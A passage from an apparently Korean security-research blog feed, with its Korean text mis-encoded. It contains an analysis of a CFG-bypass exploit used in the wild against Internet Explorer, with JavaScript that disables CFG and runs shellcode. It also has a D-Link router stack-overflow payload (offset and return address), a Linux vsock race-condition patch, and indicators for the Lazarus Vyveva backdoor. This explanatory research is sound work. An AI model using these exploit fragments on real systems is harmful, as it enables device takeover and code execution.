ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><p>ì´ì œ, rpcrt4!NdrServerCall2ê°€ ì–´ë–»ê²Œ RPC_MESSAGEë¥¼ ì°¸ì¡°í•´ì„œ add í•¨ìˆ˜ë¥¼ í˜¸ì¶œí•˜ëŠ”ì§€ ë¶„ì„í•´ë´…ì‹œë‹¤.</p><p>rpcrt4!NdrServerCall2ëŠ” rpcrt4!NdrStubCall2ë¥¼ í˜¸ì¶œí•©ë‹ˆë‹¤. rpcrt4!NdrStubCall2ëŠ” MIDL_SERVER_INFO.DispatchTableê³¼ RPC_MESSAGE.ProcNumì„ ì°¸ì¡°í•´ í•¨ìˆ˜ í¬ì¸í„° ì£¼ì†Œë¥¼ ê³„ì‚°í•©ë‹ˆë‹¤. ê·¸ë¦¬ê³  í•¨ìˆ˜ í¬ì¸í„°ì™€ í•¨ìˆ˜ì˜ ë§¤ê°œ ë³€ìˆ˜, ë§¤ê°œ ë³€ìˆ˜ì˜ ê¸¸ì´ë¥¼ rpcrt4!Invokeë¡œ ì „ë‹¬í•©ë‹ˆë‹¤.</p><p><img src="/2021/04/14/fabu1ous/cfg-bypass/7.png"></p><p>ë“œë””ì–´ rpcrt4!Invokeê°€ ì„œë²„ë¡œë¶€í„° ë°›ì€ í•¨ìˆ˜ë¥¼ í˜¸ì¶œí•©ë‹ˆë‹¤.</p><p><img src="/2021/04/14/fabu1ous/cfg-bypass/8.png"></p><p>ìœ„ì˜ ë¶„ì„ì„ ê¸°ë°˜ìœ¼ë¡œ ì„ì˜ì˜ ë©”ëª¨ë¦¬ì— ëŒ€í•œ ì½ê¸°/ì“°ê¸° ê¶Œí•œì„ ì–»ì€ í›„ ê°€ì§œ RPC_MESSAGEë¥¼ ìƒì„±, ì›í•˜ëŠ” í•¨ìˆ˜ì™€ ê·¸ ë§¤ê°œ ë³€ìˆ˜ë¥¼ ì„¤ì •, rpcrt4!NdrServerCall2 í˜¸ì¶œì„ í†µí•´ ì›í•˜ëŠ” ì–´ë–¤ í•¨ìˆ˜ë˜ êµ¬í˜„í•  ìˆ˜ ìˆê²Œ ë©ë‹ˆë‹¤.</p><p>ë‹¤ìŒìœ¼ë¡œ í•´ê²°í•´ì•¼ í•  ë¬¸ì œëŠ” ë‘ ê°€ì§€ê°€ ìˆìŠµë‹ˆë‹¤.</p><ol><li>ì–´ë–»ê²Œ í•˜ë©´ javascriptë¥¼ í†µí•´ rpcrt4!NdrServerCall2ë¥¼ í˜¸ì¶œí•  ìˆ˜ ìˆëŠ”ê°€?</li><li>rpc4!Invokeì—ì„œ ì„œë²„ ë£¨í‹´ í•¨ìˆ˜ë¥¼ í˜¸ì¶œí•  ë•Œ ì²´í¬í•˜ëŠ” CFGëŠ” ì–´ë–»ê²Œ í•´ê²°í•  ê²ƒì¸ê°€?</li></ol><p><img src="/2021/04/14/fabu1ous/cfg-bypass/9.png"></p><p>ìœ„ ì‚¬ì§„ì„ í†µí•´ ì„œë²„ ë£¨í‹´ í•¨ìˆ˜ í˜¸ì¶œì€ indirect function callì´ê³ , CFG ê²€ì‚¬ê°€ ìˆë‹¤ëŠ” ê²ƒì„ ì•Œ ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><p>ë¨¼ì € ì²« ë²ˆì§¸ ë¬¸ì œ(ì–´ë–»ê²Œ í•˜ë©´ javascriptë¥¼ í†µí•´ rpcrt4!NdrServerCall2ë¥¼ í˜¸ì¶œí•  ìˆ˜ ìˆëŠ”ê°€?)ë¥¼ í•´ê²°í•˜ê² ìŠµë‹ˆë‹¤. DOM ê°ì²´ vtableì˜ í•¨ìˆ˜ í¬ì¸í„°ë¥¼ rpcrt4!NdrServerCall2ë¡œ ë°”ê¿€ ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì™œëƒí•˜ë©´ rpcrt4!NdrServerCall2ëŠ” CFGBitmapì— ê¸°ë¡ëœ(í™”ì´íŠ¸ë¦¬ìŠ¤íŒ…ëœ) í•¨ìˆ˜ì´ë©° CFG ê²€ì‚¬ê°€ ë¹„ì •ìƒ ë™ì‘ìœ¼ë¡œ íŒë‹¨í•˜ì§€ ì•Šê¸° ë•Œë¬¸ì…ë‹ˆë‹¤. ì‹¤ì œ ê³µê²©ì— ì‚¬ìš©ëœ ìƒ˜í”Œì€ MSHTML!CAttribut::normalizeë¥¼ rpcrt4!NdrServerCall2ë¡œ ë°”ê¿” ì¹©ë‹ˆë‹¤. ê·¸ë‹¤ìŒ javascriptì—ì„œ â€œxyz.normalize()â€ë¥¼ í˜¸ì¶œí•´ ê²°ê³¼ì ìœ¼ë¡  rpcrt4!NdrServerCall2ë¥¼ í˜¸ì¶œí•©ë‹ˆë‹¤.</p><p>ë‘ ë²ˆì§¸ ë¬¸ì œ(rpc4!Invokeì—ì„œ ì„œë²„ ë£¨í‹´ í•¨ìˆ˜ë¥¼ í˜¸ì¶œí•  ë•Œ ì²´í¬í•˜ëŠ” CFGëŠ” ì–´ë–»ê²Œ í•´ê²°í•  ê²ƒì¸ê°€?)ëŠ” ë‹¤ìŒê³¼ ê°™ì€ ë°©ë²•ìœ¼ë¡œ í•´ê²°í•©ë‹ˆë‹¤.</p><ol><li>ê°€ì§œ RPC_MESSAGEì™€ rpcrt4!NdrServerCall2ë¥¼ ì‚¬ìš©í•´ VirtualProtectë¥¼ í˜¸ì¶œ, RPCRT4!__guard_check_ical_fptrì˜ ë©”ëª¨ë¦¬ ê¶Œí•œì„ PAGE_EXECUTE_READWITEë¡œ ìˆ˜ì •</li><li>rpcrt4!__guard_check_icall_fptrì— ì €ì¥ëœ í¬ì¸í„° ntdll!LdrpValidateUserCallTargetë¥¼ ntdll!KiFastSystemCallRetìœ¼ë¡œ ìˆ˜ì •í•´ rpcrt4.dllì— ëŒ€í•œ CFG ê²€ì‚¬ë¥¼ ë¹„í™œì„±í™”</li><li>RPC4!__guard_check_icall_fptrì˜ ë©”ëª¨ë¦¬ë¥¼ ë³µêµ¬</li></ol><pre><code class="hljs c"><span class="hljs-function">function <span class="hljs-title">killCfg</span><span class="hljs-params">(addr)</span> </span>&#123;  var cfgobj = <span class="hljs-keyword">new</span> CFGObject(addr)  <span class="hljs-keyword">if</span> (!cfgobj.getCFGValue())     <span class="hljs-keyword">return</span>  var guard_check_icall_fptr_address = cfgobj.getCFGAddress()  var KiFastSystemCallRet = getProcAddr(ntdll, &#x27;KiFastSystemCallRet&#x27;)  var tmpBuffer = createArrayBuffer(<span class="hljs-number">4</span>)  call2(VirtualProtect, [guard_check_icall_fptr_address, <span class="hljs-number">0x1000</span>, <span class="hljs-number">0x40</span>, tmpBuffer])  write(guard_check_icall_fptr_address, KiFastSystemCallRet, <span class="hljs-number">32</span>)  call2(VirtualProtect, [guard_check_icall_fptr_address, <span class="hljs-number">0x1000</span>, read(tmpBuffer, <span class="hljs-number">32</span>), tmpBuffer])  <span class="hljs-built_in">map</span>.<span class="hljs-keyword">delete</span>(tmpBuffer)&#125;</code></pre><p>ë‘ ê°€ì§€ ë¬¸ì œë¥¼ í•´ê²°í•œ í›„, rpcrt4.dllì— ëŒ€í•œ CFGê°€ êº¼ì ¸ìˆìœ¼ë¯€ë¡œ ê°€ì§œ RPC_MESSAGEë¥¼ ì‚¬ìš©í•´ ì›í•˜ëŠ” í•¨ìˆ˜(ë²„í¼ì— ì‰˜ ì½”ë“œë¥¼ ë‹´ê³  ìˆëŠ” í•¨ìˆ˜) í¬ì¸í„°ë¥¼ í˜¸ì¶œí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ìƒ˜í”Œì€ mis.dll+0x5000ì— ì‰˜ ì½”ë“œë¥¼ ë®ì–´ì“°ê³  rpcrt4!NdrServerCall2ë¥¼ í†µí•´ ì‰˜ ì½”ë“œë¥¼ ì‹¤í–‰í•©ë‹ˆë‹¤.</p><pre><code class="hljs c">var shellcode = <span class="hljs-keyword">new</span> Uint8Array([<span class="hljs-number">0xcc</span>])var msi = call2(LoadLibraryExA, [newStr(&#x27;msi.dll&#x27;), 0, 1]) + 0x5000var tmpBuffer = createArrayBuffer(<span class="hljs-number">4</span>)call2(VirtualProtect, [msi, shellcode.length, <span class="hljs-number">0x4</span>, tmpBuffer])writeData(msi, shellcode)call2(VirtualProtect, [msi, shellcode.length, read(tmpBuffer, <span class="hljs-number">32</span>), tmpBuffer])call2(msi, [])</code></pre><p>ë‹¤ìŒì€ ìµìŠ¤í”Œë¡œì‡ì— ì„±ê³µí•œ ìŠ¤í¬ë¦°ìƒ·ì…ë‹ˆë‹¤.</p><p><img src="/2021/04/14/fabu1ous/cfg-bypass/10.png"></p><h1 id="Some-thoughts"><a href="#Some-thoughts" class="headerlink" title="Some thoughts"></a>Some thoughts</h1><p>ì‹¤ì œ ê³µê²©ì— ì‚¬ìš©ëœ CVE-2021-26411 ìƒ˜í”Œì€ CFG ë³´í˜¸ ê¸°ë²•ì„ ìµìŠ¤í”Œë¡œì‡ í•˜ëŠ” ìƒˆë¡œìš´ ê¸°ìˆ ì„ ë‹´ê³  ìˆìŠµë‹ˆë‹¤. í•´ë‹¹ ìµìŠ¤í”Œë¡œì‡ ê¸°ë²•ì€ ROPì— ì˜ì¡´í•˜ì§€ ì•Šì•„ë„ ë˜ë©° RPC_MESSAGEë¥¼ í†µí•´ ì„ì˜ ì½”ë“œ ì‹¤í–‰(Arbitrary Code Execution)ì„ ë‹¬ì„±í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ë˜í•œ ê°„ê²°í•˜ê³  ì‹ ë¢°ë„(ì„±ê³µë¥ )ê°€ ë†’ìŠµë‹ˆë‹¤. ì•ìœ¼ë¡œ CFG ë³´í˜¸ ê¸°ë²•ì„ íš¨ê³¼ì ìœ¼ë¡œ ìš°íšŒí•˜ê¸° ìœ„í•œ ë°©ë²•ìœ¼ë¡œ í†µìš©ë  ê²ƒì´ë¼ ìƒê°í•©ë‹ˆë‹¤.</p><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p>[1] <a href="https://docs.microsoft.com/en-us/windows/win32/secbp/control-flow-guard">https://docs.microsoft.com/en-us/windows/win32/secbp/control-flow-guard</a></p><p>[2] <a href="https://windows-internals.com/cet-on-windows/">https://windows-internals.com/cet-on-windows/</a></p><p>[3] <a href="https://docs.microsoft.com/en-us/windows/win32/rpc/rpc-start-page">https://docs.microsoft.com/en-us/windows/win32/rpc/rpc-start-page</a></p>]]></content>
    
    
    <categories>
      
      <category>Translation</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fabu1ous</tag>
      
      <tag>cve</tag>
      
      <tag>bypass</tag>
      
      <tag>cfg</tag>
      
      <tag>rpc</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[í•˜ë£¨í•œì¤„] CVE-2021-26708: Linux ì»¤ë„ ê°€ìƒ ì†Œì¼“ ë¼ì´ë¸ŒëŸ¬ë¦¬ì˜ Race Condition ì·¨ì•½ì </title>
    <link href="/2021/04/13/l0ch/2021-04-13/"/>
    <url>/2021/04/13/l0ch/2021-04-13/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://a13xp0p0v.github.io/2021/02/09/CVE-2021-26708.html">Four Bytes of Power: exploiting CVE-2021-26708 in the Linux kernel</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Linux kernel</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Zer0con 2021ì—ì„œ Linux ì»¤ë„ì˜ ë¡œì»¬ ê¶Œí•œ ìƒìŠ¹ ì·¨ì•½ì ì´ ê³µê°œë˜ì—ˆìŠµë‹ˆë‹¤.</p><p>ì·¨ì•½ì ì€ ê°€ìƒ ë¨¸ì‹ ê³¼ í•˜ì´í¼ë°”ì´ì € ê°„ì˜ í†µì‹ ì„ ìœ„í•œ ì†Œì¼“ í”„ë¡œí† ì½œì¸ virtual socket libraryì—ì„œ ë°œê²¬ë˜ì—ˆìœ¼ë©° <code>net/vmw_vsock/af_vsock.c</code> ì˜ ë‹¤ìŒ í•¨ìˆ˜ë“¤ì— ì¡´ì¬í•©ë‹ˆë‹¤.</p><ul><li><code>vsock_poll()</code></li><li><code>vsock_dgram_sendmsg()</code></li><li><code>vsock_stream_setsockopt()</code></li><li><code>vsock_stream_sendmsg()</code></li><li><code>vsock_stream_recvmsg()</code></li></ul><p>ì´ ì¤‘ <code>vsock_stream_setsockopt()</code> ì˜ ì½”ë“œì…ë‹ˆë‹¤.</p><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> <span class="hljs-title">vsock_stream_setsockopt</span><span class="hljs-params">(struct socket *sock,</span></span><span class="hljs-function"><span class="hljs-params">   <span class="hljs-keyword">int</span> level,</span></span><span class="hljs-function"><span class="hljs-params">   <span class="hljs-keyword">int</span> optname,</span></span><span class="hljs-function"><span class="hljs-params">   <span class="hljs-keyword">sockptr_t</span> optval,</span></span><span class="hljs-function"><span class="hljs-params">   <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> optlen)</span></span><span class="hljs-function"><span class="hljs-comment">/* ... */</span></span><span class="hljs-function">struct sock *sk</span>;<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">vsock_sock</span> *<span class="hljs-title">vsk</span>;</span><span class="hljs-keyword">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">vsock_transport</span> *<span class="hljs-title">transport</span>;</span><span class="hljs-comment">/* ... */</span>sk = sock-&gt;sk;vsk = vsock_sk(sk);transport = vsk-&gt;transport;lock_sock(sk);</code></pre><p>ê°€ìƒ ì†Œì¼“ ì „ì†¡ í¬ì¸í„°ì¸ <code>vskâ†’transport</code>ëŠ” ë¡œì»¬ ë³€ìˆ˜ì¸ <code>transport</code>ì— ì €ì¥ë˜ëŠ”ë°, ë¡œì»¬ ë³€ìˆ˜ì— ì €ì¥í•œ ì´í›„ ì†Œì¼“ <code>sk</code>ì— ëŒ€í•œ lockì„ íšë“í•˜ë¯€ë¡œ <code>vskâ†’transport</code>ì˜ ê°’ì´ ë³€ê²½ë  ìˆ˜ ìˆê³  ì´ëŠ” race conditionì„ í†µí•´ ë¡œì»¬ ê¶Œí•œ ìƒìŠ¹ê¹Œì§€ ì´ì–´ì§‘ë‹ˆë‹¤.</p><p>ì œë³´ìëŠ” 5ê°œì˜ í•¨ìˆ˜ì—ì„œ race conditionì„ ìœ ë°œí•˜ëŠ” ë™ì¼í•œ ì·¨ì•½ì ì„ ë°œê²¬í–ˆìœ¼ë©° ì•„ë˜ì™€ ê°™ì´ ì†Œì¼“ <code>sk</code>ì— ëŒ€í•œ lockì„ íšë“í•œ ì´í›„ ë¡œì»¬ ë³€ìˆ˜ì— ì €ì¥í•˜ë„ë¡ íŒ¨ì¹˜ë˜ì—ˆìŠµë‹ˆë‹¤.</p><pre><code class="hljs cpp">sk = sock-&gt;sk;vsk = vsock_sk(sk);-transport = vsk-&gt;transport;  lock_sock(sk); +transport = vsk-&gt;transport;</code></pre><p>Githubì— ê³µê°œëœ ìì„¸í•œ íŒ¨ì¹˜ íˆìŠ¤í† ë¦¬ëŠ” <a href="https://github.com/torvalds/linux/commit/c518adafa39f37858697ac9309c6cf1805581446">https://github.com/torvalds/linux/commit/c518adafa39f37858697ac9309c6cf1805581446</a> ì—ì„œ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>linux</tag>
      
      <tag>kernel</tag>
      
      <tag>lpe</tag>
      
      <tag>toctou</tag>
      
      <tag>race condition</tag>
      
      <tag>L0ch</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[í•˜ë£¨í•œì¤„] í™”ë¬¼ ë¬¼ë¥˜ íšŒì‚¬ ê³µê²©ì— ì‚¬ìš©ëœ ë¼ìë£¨ìŠ¤ ê·¸ë£¹ì˜ ë°±ë„ì–´ Vyveva</title>
    <link href="/2021/04/12/idioth/2021-04-12/"/>
    <url>/2021/04/12/idioth/2021-04-12/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://www.welivesecurity.com/2021/04/08/are-you-afreight-dark-watch-out-vyveva-new-lazarus-backdoor/">(Are you) afreight of the dark? Watch out for Vyveva, new Lazarus backdoor</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Windows</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>ESETì—ì„œ ë¼ìë£¨ìŠ¤ ê·¸ë£¹ì´ ë‚¨ì•„í”„ë¦¬ì¹´ í™”ë¬¼ ë¬¼ë¥˜ íšŒì‚¬ë¥¼ ê³µê²©í•˜ëŠ” ë° ì‚¬ìš©ëœ ë°±ë„ì–´ Vyvevaë¥¼ ë°œê²¬í•˜ì˜€ìŠµë‹ˆë‹¤. ë°±ë„ì–´ëŠ” ë§ì€ ê¸°ëŠ¥ì´ í¬í•¨ë˜ì–´ ìˆìœ¼ë©° í† ë¥´ ë„¤íŠ¸ì›Œí¬ë¥¼ í†µí•´ C&amp;C ì„œë²„ì™€ í†µì‹ í•©ë‹ˆë‹¤.</p><p>VyvevaëŠ” ì´ì „ ë¼ìë£¨ìŠ¤ì—ì„œ ì‚¬ìš©í•œ NukeSped ì•…ì„±ì½”ë“œì™€ ë¹„ìŠ·í•œ ì½”ë“œë¥¼ ì‚¬ìš©í•©ë‹ˆë‹¤. ë„¤íŠ¸ì›Œí¬ í†µì‹ ì—ì„œ fake TLS ì‚¬ìš©, command line execution chains, ì•”í˜¸í™” ë° í† ë¥´ ì„œë¹„ìŠ¤ ì‚¬ìš© ë“±ì„ ë¯¸ë£¨ì–´ë³´ì•„ ë¼ìë£¨ìŠ¤ì˜ ë°”ì´ëŸ¬ìŠ¤ì„ì„ ì•Œ ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><p>VyvevaëŠ” ì¸ìŠ¤í†¨ëŸ¬, ë¡œë”, ë°±ë„ì–´ ì„¸ ê°€ì§€ë¡œ êµ¬ì„±ë˜ì–´ ìˆìŠµë‹ˆë‹¤. ì¸ìŠ¤í†¨ëŸ¬ëŠ” ë°±ë„ì–´ ë¡œë”ì˜ ìœ ì§€ë¥¼ ìœ„í•œ ì„œë¹„ìŠ¤ë¥¼ ìƒì„±í•˜ê³  ë‚´ì¥ëœ ë°±ë„ì–´ ì„¤ì •ì„ ë ˆì§€ìŠ¤íŠ¸ë¦¬ì— ì €ì¥í•©ë‹ˆë‹¤. ì •ìƒì ì¸ ì„œë¹„ìŠ¤ë¡œ ìœ„ì¥í•˜ê¸° ìœ„í•´ì„œ ì„œë¹„ìŠ¤ ì´ë¦„ê³¼ í‘œì‹œë˜ëŠ” ì´ë¦„ì€ ì´ë¯¸ ì¡´ì¬í•˜ëŠ” ì„œë¹„ìŠ¤ì—ì„œ ë¬´ì‘ìœ„ë¡œ ë‹¨ì–´ë¥¼ ì¡°í•©í•˜ì—¬ ìƒì„±ë©ë‹ˆë‹¤. ê·¸ í›„ infection IDë¥¼ ë¬´ì‘ìœ„ ê°’ìœ¼ë¡œ ìƒì„±í•˜ì—¬ ë‹¤ìŒê³¼ ê°™ì´ ë ˆì§€ìŠ¤íŠ¸ë¦¬ì— ì €ì¥í•©ë‹ˆë‹¤.</p><pre><code class="hljs ini"><span class="hljs-section">[HKLM\SOFTWARE\Microsoft\DirectX]</span><span class="hljs-attr">UsageMask</span> = &lt;CONFIG_DATA&gt;</code></pre><p>Vyvevaì˜ ë©”ì¸ì¸ ë°±ë„ì–´ëŠ” C&amp;C ì„œë²„ì— ì ‘ì†í•˜ê³  ëª…ë ¹ì–´ë¥¼ ì‹¤í–‰í•©ë‹ˆë‹¤. 23ê°œì˜ ëª…ë ¹ì–´ê°€ ì¡´ì¬í•˜ë©°, ì¼ë¶€ëŠ” ë¹„ë™ê¸°ì‹ìœ¼ë¡œ ìì²´ ìŠ¤ë ˆë“œì—ì„œ ì‹¤í–‰ë©ë‹ˆë‹¤. ëŒ€ë¶€ë¶„ íŒŒì¼ ë° í”„ë¡œì„¸ìŠ¤ ì‘ì—…ì´ë‚˜ ì •ë³´ ìˆ˜ì§‘ì„ ìœ„í•œ ëª…ë ¹ì–´ì§€ë§Œ íŒŒì¼ <a href="https://attack.mitre.org/versions/v8/techniques/T1070/006/">timestomping</a>ì„ ìœ„í•œ ëª…ë ¹ì–´ë„ ì¡´ì¬í•©ë‹ˆë‹¤. ë˜í•œ ë°±ë„ì–´ëŠ” ìƒˆë¡œ ì—°ê²°ë˜ê±°ë‚˜ ì—°ê²°ì´ ëŠì–´ì§„ ë“œë¼ì´ë¸Œë¥¼ ëª¨ë‹ˆí„°ë§í•˜ë©° ë¡œê·¸ì˜¨í•œ ì‚¬ìš©ì ìˆ˜ë¥¼ ëª¨ë‹ˆí„°ë§í•˜ëŠ” ì„¸ì…˜ ê°ì‹œ ê¸°ëŠ¥ ë˜í•œ ì¡´ì¬í•©ë‹ˆë‹¤. ìƒˆ ë“œë¼ì´ë¸Œë‚˜ ì„¸ì…˜ ì´ë²¤íŠ¸ê°€ ë°œìƒí•˜ë©´ ê¸°ì¡´ ì„¤ì •ëœ ê°„ê²©ì„ ë¬´ì‹œí•˜ê³  C&amp;C ì„œë²„ì— ì—°ê²°í•©ë‹ˆë‹¤. ë°œê²¬ëœ Vyvevaì˜ ìƒ˜í”Œë“¤ì€ ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤.</p><table><thead><tr><th>SHA-1</th><th>Filename</th><th>Description</th></tr></thead><tbody><tr><td>DAD50AD3682A3F20B2F35BE2A94B89E2B1A73067</td><td>powerctl.exe</td><td>Installer</td></tr><tr><td>69529EED679B0C7F1ACC1FD782A4B443CEC0CF83</td><td>powerctl.dll</td><td>Loader (x86)</td></tr><tr><td>043ADDFB93A10D187DDE4999D78096077F26E9FD</td><td>wwanauth.dll</td><td>Loader (x64)</td></tr><tr><td>1E3785FC4FE5AB8DAB31DDDD68257F9A7FC5BF59</td><td>wwansec.dll</td><td>Loader (x86)</td></tr><tr><td>4D7ADD8145CB096359EBC3E4D44E19C2735E0377</td><td>msobjs.drx</td><td>Backdoor (ecnrypted)</td></tr><tr><td>92F5469DBEFDCEE1343934BE149AFC1241CC8497</td><td>msobjs.drx</td><td>Backdoor (dencrypted with fixed MZ header)</td></tr><tr><td>A5CE1DF767C89BF29D40DC4FA6EAECC9C8979552</td><td>JET76C5.tmp</td><td>Bacckdoor Tor library (encrypted)</td></tr><tr><td>66D17344A7CE55D05A324E1C6BE2ECD817E72680</td><td>JET76C5.tmp</td><td>Backdoor Tor library (dencrypted with fixed MZ header)</td></tr></tbody></table>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>backdoor</tag>
      
      <tag>idioth</tag>
      
      <tag>malware</tag>
      
      <tag>lazarus</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[í•˜ë£¨í•œì¤„] CVE-2021-26709: D-Link DSL-320B-D1 Pre-Auth Buffer Overflow</title>
    <link href="/2021/04/11/insu/2021-04-11/"/>
    <url>/2021/04/11/insu/2021-04-11/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://packetstormsecurity.com/files/162133/CVE-2021-26709_advisory.txt">D-Link DSL-320B-D1 Pre-Authentication Buffer Overflow</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>DSL-320B-D1, EU_1.25 and lower</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>ADSL ëª¨ë€, DSL-320b-D1, EU_1.25 ì´í•˜ì˜ ë²„ì „ì—ì„œ ì¸ì¦ë˜ì§€ ì•Šì€ ì‚¬ìš©ìê°€ ì›ê²©ì—ì„œ ë””ë°”ì´ìŠ¤ë¥¼ íƒˆì·¨í•  ìˆ˜ ìˆëŠ” Stack Buffer Overflow ì·¨ì•½ì ì´ ë°œê²¬ë˜ì—ˆìŠµë‹ˆë‹¤.</p><p>ì·¨ì•½ì ì€ ë¡œê·¸ì¸ì„ ë‹´ë‹¹í•˜ëŠ” <code>login.xgi</code>ì—ì„œ <code>user</code>ì™€ <code>pass</code> ì¸ìë¥¼ í†µí•´ ë°œìƒí•©ë‹ˆë‹¤.</p><pre><code class="hljs routeros"><span class="hljs-builtin-name">GET</span> /login.xgi?<span class="hljs-attribute">user</span>=<span class="hljs-string">&quot; + payload + &quot;</span>&amp;pass=abcde HTTP/1.1\\nHost: <span class="hljs-string">&quot; +</span><span class="hljs-string">host + &quot;</span>\\n\\n<span class="hljs-string">&quot;</span></code></pre><p><code>user</code> íŒŒë¼ë¯¸í„°ë¥¼ ì‚¬ìš©í•´ ì·¨ì•½ì ì„ ì•…ìš©í•˜ê¸° ìœ„í•´ì„œ êµ¬ì„±ë˜ëŠ” í˜ì´ë¡œë“œëŠ” ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤.</p><pre><code class="hljs apache"><span class="hljs-attribute">OFFSET</span> = <span class="hljs-number">652</span><span class="hljs-attribute">ADDR</span> = <span class="hljs-number">0</span>x<span class="hljs-number">7</span>ffe<span class="hljs-number">8</span>ab<span class="hljs-number">0</span><span class="hljs-attribute">payload</span> = <span class="hljs-string">&quot;A&quot;</span>*OFFSET<span class="hljs-attribute">payload</span> += pack(<span class="hljs-string">&quot;&gt;I&quot;</span>, ADDR)<span class="hljs-attribute">payload</span> += shellcode</code></pre><p>ë°˜ë©´ì— <code>pass</code> íŒŒë¼ë¯¸í„°ëŠ” ì˜¤í”„ì…‹ìœ¼ë¡œ 641ì„ ì‚¬ìš©í•©ë‹ˆë‹¤. í˜ì´ë¡œë“œëŠ” GET requestì—ì„œ íŒŒë¼ë¯¸í„°ë¡œ ì „ë‹¬ë˜ì–´ì•¼ í•˜ë©° ROPë¥¼ ì‚¬ìš©í•˜ë©´ í•˜ë“œ ì½”ë”©ëœ ì£¼ì†Œë¥¼ ì‚¬ìš©í•˜ì§€ ì•Šê³  exploitì´ ê°€ëŠ¥í•©ë‹ˆë‹¤.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>bof</tag>
      
      <tag>insu</tag>
      
      <tag>d-link</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[Translation] Architecture of Ransomware Part 1</title>
    <link href="/2021/04/11/idioth/arch_of_ransomware_part1/"/>
    <url>/2021/04/11/idioth/arch_of_ransomware_part1/</url>
    
    <content type="html"><![CDATA[<p>ì•ˆë…•í•˜ì„¸ìš”! idiothì…ë‹ˆë‹¤. ì˜¤ëœë§Œì— ë²ˆì—­ê¸€ì„ í•˜ë‚˜ ë“¤ê³  ì™”ìŠµë‹ˆë‹¤. ìµœê·¼ ghidra ì‹œë¦¬ì¦ˆë¥¼ ì§„í–‰ + í•™êµ ê³¼ì œ + ê·¸ ì™¸ì˜ ê°œì¸ ì‚¬ì •ìœ¼ë¡œ ì¸í•´ ë³´ë ¤ê³  í–ˆë˜ ê¸€ì„ ì¢€ ë¯¸ë¤„ë†”ì„œ ì¢€ ì œ ìì‹ ì„ í™˜ê¸°ì‹œí‚¬ ê²¸ ì½ìœ¼ë©´ì„œ ë²ˆì—­ì„ ì«™í•´ë´¤ìŠµë‹ˆë‹¤.</p><p>ëœì„¬ì›¨ì–´ê°€ ìœ í–‰ì´ë¼ê³  í•´ì•¼ í•˜ë‚˜ ë³´ì•ˆ í•„ë“œì˜ ì‚¬ëŒë“¤ ë¿ë§Œ ì•„ë‹ˆë¼ ì¼ë°˜ì ì¸ ì‚¬ëŒí•œí…Œë„ ë§ì´ ìµìˆ™í•´ì§„ ì§€ëŠ” ê½¤ ë˜ì—ˆë‹¤ê³  ìƒê°ì„ í•©ë‹ˆë‹¤. í•˜ì§€ë§Œ ëœì„¬ì›¨ì–´ëŠ” ê³„ì†í•´ì„œ ë°œì „í•˜ê³  ìˆì£ ! íŒŒíŠ¸ 1 ë¶€ë¶„ì€ ë„ˆë¬´ ì–´ë µì§€ ì•Šì€ ì´ì•¼ê¸°ê°€ ì£¼ë¥¼ ì´ë£¨ë‹ˆ ê°€ë²¼ìš´ ë§ˆìŒìœ¼ë¡œ(?) ì½ì–´ì£¼ì‹œë©´ ë  ê²ƒ ê°™ìŠµë‹ˆë‹¤!</p><p>ë²ˆì—­ê¸€ì€ ëŠ˜â€¦ã…ã… ì˜ì—­ê³¼ ì˜¤ì—­ì´ ì¡´ì¬í•  ìˆ˜ ìˆê³  ì˜ëª»ëœ ë¶€ë¶„ì€ ì§€ì í•´ì£¼ì‹œë©´ ê°ì‚¬í•˜ê² ìŠµë‹ˆë‹¤!</p><hr><blockquote><p>ì›ë¬¸ ê¸€ : <a href="https://infosecwriteups.com/architecture-of-a-ransomware-1-2-1b9fee757fcb">Architecture of a ransomware (1/2)</a></p></blockquote><p>COVID-19ë¡œ ì¸í•´ ì›ê²© ì—…ë¬´ê°€ ì¦ê°€í•¨ì— ë”°ë¼ ëœì„¬ì›¨ì–´ì™€ ê´€ë ¨ëœ ì‚¬ê±´ì´ ì¦ê°€í•˜ê³  ìˆë‹¤. ëª¨ë“  ëœì„¬ì›¨ì–´ëŠ” ê°™ì€ ë°©ì‹ìœ¼ë¡œ 